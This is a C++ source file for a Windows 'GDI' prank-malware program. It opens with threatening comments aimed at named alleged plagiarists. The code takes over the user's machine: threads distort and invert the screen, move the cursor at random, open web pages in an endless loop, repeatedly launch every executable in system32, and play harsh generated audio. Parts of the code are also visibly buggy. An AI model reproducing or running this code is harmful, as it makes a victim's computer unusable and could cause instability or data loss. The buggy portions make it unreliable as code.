﻿//This GDI program was created by Tamsin-RTX on Bilibili. N17pro3726, I advise you to know your place.
//This is a formal warning to N173426 and all those who have plagiarized the GDI program. 
// I'm based in China and unable to access YouTube, but let me make this clear — N17pro3426 and everyone involved in copying GDI programs, 
// your plagiarism has reached China. N173426, don't pretend I'm unaware of how many GDI programs you've stolen. Don't think I don't know you're in Ukraine.
//This program was officially launched on November 5, 2026, and this rule took effect on the same day. 
// Let me warn you, if I find out you're copying my code, you won't like the consequences.


#include <windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <atomic>
#include <vector>
#include <mmdeviceapi.h>
#include <audioclient.h>
#include <intrin.h>
#include <time.h>
#include <math.h>
#include <accctrl.h>
#include <fstream>
#include <climits>

#pragma warning( disable: 4152 )
#pragma warning( disable: 4201 )

#define RGBQUAD _RGBQUAD
#define NUM_ACES 2
#pragma warning( push, 0 )
#include <windows.h>
#pragma warning( pop )
#undef RGBQUAD

#include <accctrl.h>
#include <aclapi.h>
#include <stdio.h>
#include <math.h>
#pragma region Public Variables
extern HWND hwndDesktop;
extern HDC hdcDesktop;
extern RECT rcScrBounds;
extern HHOOK hMsgHook;
extern INT nCounter;
#pragma endregion Public Variables
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma once
#pragma warning( disable: 4152 )
#pragma warning( disable: 4201 )
#pragma comment(lib, "winmm.lib")
#pragma warning(default : 4146)

#define RGBQUAD _RGBQUAD
#define BUFFER_SIZE 65536

#define LMIN 4
#define LMAX 32767
#define _DISK_PATH_LEN_ 32
#pragma warning( push, 0 )
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
#include <cmath>
#pragma comment(lib, "winmm.lib")
#define M_PI 3.14159265358979323846264338327950288
WCHAR myDir[MAX_PATH] = { 0 };
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
WCHAR buffer[MAX_PATH] = { 0 };
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
struct FlashInfo {
	HWND hWnd;
	int  maxCount;
	int  interval;
};
unsigned int Xorshift32()
{
	static unsigned int x = 2463534242U; // 可选初始种子
	x ^= x << 13;
	x ^= x >> 17;
	x ^= x << 5;
	return x;
}
void GetRandomPath(WCHAR* buffer, int length) {
	// 用时间作为种子，保证每次运行生成的随机数不同
	srand((unsigned int)time(NULL));

	// Windows 临时文件常用的合法字符池
	const WCHAR charset[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

	for (int i = 0; i < length - 1; ++i) {
		buffer[i] = charset[rand() % (sizeof(charset) / sizeof(charset[0]) - 1)];
	}
	buffer[length - 1] = L'\0'; // 字符串结尾
}

using namespace std;
DWORD WINAPI MouseMoveThread(LPVOID lpParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// 初始化随机数种子
	srand((unsigned int)time(0));

	// 无限循环，让鼠标随机移动
	while (true) {
		int x = rand() % screenWidth;   // 随机生成x坐标
		int y = rand() % screenHeight;  // 随机生成y坐标
		SetCursorPos(x, y);             // 设置鼠标位置
		Sleep(200);                     // 每次移动间隔100毫秒
	}

}
DWORD WINAPI drawEllipse(LPVOID lpParam)
{
	while (1) {
		HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
		INT y = GetSystemMetrics(0), x = GetSystemMetrics(1);
		BITMAPINFO bmi = { 0 };
		PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 45;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = y;
		bmi.bmiHeader.biHeight = x;
		HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hdcMem, hbmTemp);
		StretchBlt(hdcScreen, -20, -20, y + 40, x + 40, hdcScreen, 0, 0, y, x, SRCCOPY);
		DrawIcon(hdcScreen, rand() % y, rand() % x, LoadCursor(0, IDC_ARROW));
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		Sleep(100);
	}
}
DWORD WINAPI draw(LPVOID lpParam)
{
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 1.0f) {
			int a = sin(angle) * 12;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCINVERT);
			angle += M_PI / 80;
			DeleteObject(&i); DeleteObject(&a);
			DrawIcon(desk, rand() % sw, rand() % sh, LoadCursor(0, IDC_ARROW));
			Sleep(1);
		}
		ReleaseDC(wnd, desk);
	}
}
DWORD WINAPI dra(LPVOID lpParam)
{
	int sw, sh;

	while (1) {
		HDC hdc = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(hdc, -20, -20, sw + 40, sh + 40, hdc, 0, 0, sw, sh, SRCINVERT);
		DrawIcon(hdc, rand() % sw, rand() % sh, LoadCursor(0, IDC_ARROW));
		ReleaseDC(0, hdc); 
		Sleep(1);
	}
}
DWORD WINAPI dr(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb *= x ^ y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		Sleep(1);
	}
}
DWORD WINAPI sr100(LPVOID lpParam) {
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		POINT p[4] = { rand() % sw, rand() % sh, rand() % sw, rand() % sh,  rand() % sw, rand() % sh };
		HPEN hPen = CreatePen(PS_SOLID, 5, Hue(239));
		SelectObject(hdc, hPen);
		PolyBezier(hdc, p, 4);
		DeleteObject(hPen);
		ReleaseDC(0, hdc);
		Sleep(4);
	}
}
DWORD WINAPI sr200(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int y = GetSystemMetrics(0), x = GetSystemMetrics(1);
	while (1) {
		BitBlt(hdc, rand() % 3, rand() % 2, y, x, hdc, 2, 3, SRCINVERT);
		ReleaseDC(0, hdc);
		Sleep(1500);
	}
}
DWORD WINAPI qr(LPVOID lpvd) {
	HDC hdc = GetDC(0);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	while (1) {
		DrawIcon(hdc, rand() % w, rand() % h, LoadCursor(0, IDC_ARROW));
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI icons(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int x = rand() % GetSystemMetrics(SM_CXSCREEN);
		int y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hdc, x, y, LoadIcon(0, IDI_ERROR));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		Sleep(2);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI i07(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		DrawIcon(hdc, w, h, LoadIcon(0, IDI_APPLICATION));
		BitBlt(hdc, 0, 0, w, h, hdc, -90, 0, SRCCOPY);
		SelectObject(hdc, 0);
		ReleaseDC(0, hdc);
		Sleep(180);
	}
}
DWORD WINAPI swirl(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
		}
		for (int i = 0; i < sw * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
		Sleep(300);
	}
}
DWORD WINAPI d(LPVOID lpParam)
{
	int sw, sh;

	while (1) {
		HDC hdc = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(hdc, -20, -20, sw + 40, sh + 40, hdc, 0, 0, sw, sh, SRCCOPY);
		DrawIcon(hdc, rand() % sw, rand() % sh, LoadCursor(0, IDC_ARROW));
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
DWORD WINAPI shader5(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		DrawIcon(desk, rand() % sw, rand() % sh, LoadCursor(0, IDC_ARROW));
		Sleep(1);
		for (float i = 0; i < sw + sh; i += 0.8f) {
			int a = sin(angle) * 14;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
			angle += M_PI / 109;
			DeleteObject(&i); DeleteObject(&a);
		}
		DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
		Sleep(20);
	}
}
DWORD WINAPI shader6(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	for (;;) {
		desk = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(0);
		HBITMAP scr = CreateDIBSection(hdcMem, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(hdcMem, scr);
		BitBlt(hdcMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh;
			rgbtriple[i].rgbtRed += x & y;
			rgbtriple[i].rgbtGreen += x & y;
			rgbtriple[i].rgbtBlue += x & y;
		}
		BitBlt(desk, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		DeleteDC(desk); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
		Sleep(200);
	}
}
DWORD WINAPI sr300(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		DrawIcon(desk, rand() % sw, rand() % sh, LoadCursor(0, IDC_ARROW));
		Sleep(1);
		for (float i = 0; i < sw + sh; i += 0.99f) {
			int a = sin(angle) * 15;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
			angle += M_PI / 109;
			DeleteObject(&i); DeleteObject(&a);
		}
		DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
		Sleep(40);
	}
}
DWORD WINAPI sr400(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (1) {
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(1600);
	}
}
DWORD WINAPI sr500(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	int y = GetSystemMetrics(0), x = GetSystemMetrics(1);
	while (1) {
		BitBlt(hdc, rand() % 5, rand() % 5, y, x, hdc, 5, 5, SRCINVERT);
		ReleaseDC(0, hdc);
		Sleep(500);
	}
}
DWORD WINAPI sr600(LPVOID lpParam)
{
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 1.0f) {
			int a = sin(angle) * 12;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCINVERT);
			angle += M_PI / 80;
			DeleteObject(&i); DeleteObject(&a);
		}
		ReleaseDC(wnd, desk);
	}
}
DWORD WINAPI rd600(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	PRGBQUAD rgbquad = NULL;
	for (;;) {
		hdc = GetDC(NULL); HDC hdcCopy = CreateCompatibleDC(hdc);
		if (hdcCopy == NULL) { ReleaseDC(0, hdc); continue; }
		bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hdcCopy, bmp);
		INT i = 0;
		while (1) {
			hdc = GetDC(NULL);
			StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
			for (int x = 0; x < w; x++) {
				for (int y = 0; y < h; y++) {
					int index = y * w + x;
					double fractalX = (10.0f / w);
					double fractalY = (1.90f / h);
					double cx = x * fractalX - 10.f;
					double cy = y * fractalY - 1.0f;
					double a = 0, b = 0; int i = 0;
					while (((a * a) + (b * b)) < 10 && i < 50) {
						double absA = fabs(a), absB = fabs(b);
						double aa = absA * absA - absB * absB + cx;
						double bb = 2 * absA * absB + cy;
						a = aa; b = bb;
						i++;
						rgbquad[index].rgb += i;
					}
				}
			}
			i++;
			StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
			DeleteDC(hdc); DeleteObject(&w); DeleteObject(&h); DeleteObject(&hdcCopy); DeleteObject(&rgbquad);
			Sleep(0);
		}
	}
}
DWORD WINAPI rd300(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int r = 2, g = 1, b = 4, power = 22;
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 3) {
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
		SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		DeleteDC(hdc); DeleteObject(&w); DeleteObject(&h); DeleteObject(&hdcMem); DeleteObject(&hbm); DeleteObject(&data);
		Sleep(1);
	}
}
DWORD WINAPI rd200(LPVOID lpParam)
{
	while (1)
	{
		ShellExecute(NULL, L"open", L"https://www.baidu.com", NULL, NULL, SW_SHOWNORMAL);
		ShellExecute(NULL, L"open", L"https://www.bilibili.com/", NULL, NULL, SW_SHOWNORMAL);
		ShellExecute(NULL, L"open", L"https://space.bilibili.com/3546581317978244?spm_id_from=333.1007.0.0", NULL, NULL, SW_SHOWNORMAL);
		Sleep(4000);
	}
	return 0;
}
DWORD WINAPI shader15(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	Sleep(200);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].r += 666;
			rgbScreen[i].g += 666;
			rgbScreen[i].b += 666;
		}
		ReleaseDC(0, hdcScreen);
	}
}
DWORD WINAPI balls(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(400);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI sh(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int X = GetSystemMetrics(SM_CXSCREEN);
	int Y = GetSystemMetrics(SM_CYSCREEN);

	while (TRUE)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int sw = GetSystemMetrics(SM_CXSCREEN);
		int sh = GetSystemMetrics(SM_CYSCREEN);
		BitBlt(hdc, rand() % 10, rand() % 10, sw, sh, hdc, rand() % 10, rand() % 10, SRCINVERT);
		if ((rand() % 100 + 1) % 67 == 0) InvalidateRect(0, 0, 0);
		ReleaseDC(0, hdc);
		Sleep(1200);
	}
}
DWORD WINAPI d03(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 0.8f) {
			int a = sin(angle) * 4;
			BitBlt(hdc, i, 0, 1, sh, hdc, i, a, SRCCOPY);
			angle += M_PI / 118;
			DeleteObject(&a); DeleteObject(&i);
		}
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
		Sleep(6);
	}
}
DWORD WINAPI p34(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, SRCCOPY);
		SelectObject(hdc, 0);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		Sleep(30);
	}
}
DWORD WINAPI system32(LPVOID lpParam)//credits to N17Pro3426
{
	HANDLE FirstFileW; // esi
	int v2; // eax
	struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-258h] BYREF

	while (true)
	{
		do
		{
			FirstFileW = FindFirstFileW(L"C:\\WINDOWS\\system32\\*.exe", &FindFileData);
			ShellExecuteW(0, L"open", FindFileData.cFileName, 0, 0, 5);
		} while (!FindNextFileW(FirstFileW, &FindFileData));
		do
		{
			ShellExecuteW(0, L"open", FindFileData.cFileName, 0, 0, 5);
			v2 = rand();
			Sleep(v2 % 5000);
		} while (FindNextFileW(FirstFileW, &FindFileData));
	}
}
VOID WINAPI sound1()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 14500, 14500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[14500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((t ^ t >> 8) * (t | t >> 5) + (t | t << 4) + (t | t >> 7)) / 674);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24500, 24500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t >> 12) * (t >> 4 | t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t | t >> 5) >> (t >> 15)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 23500, 23500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[23500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 2 >> (static_cast<int>(t * 4.5) >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 15900, 15900, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[15900 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t | t % 255 | t % 257) + (t & t >> 8) + (t * (42 & t >> 10)) + ((t % ((t >> 8 | t >> 16) + 1)) ^ t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24500, 24500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24500 * 30] = {};

	for (int t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>(((t >> 6) ^ (t & (t >> 9)) ^ (t >> 12) | ((t << (t >> 6)) % 4) ^ (-(int)t & (t >> 13))) % 128 ^ (t >> 1));
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8400, 8400, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8400 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & ((t >> 18) + ((t >> 11) & t))) * t + (((t >> 8 & t) - (t >> 3 & t >> 8 | t >> 16)) & 128));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & ((t >> 18) + ((t >> 11) & 60))) * 100 + (((t >> 8 & t) - (t >> 3 & t >> 8 | t >> 16)) & 128));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 17500, 17500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t ^ t + (t >> 11 | 0) / (t - 12000 ^ t) >> 11));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
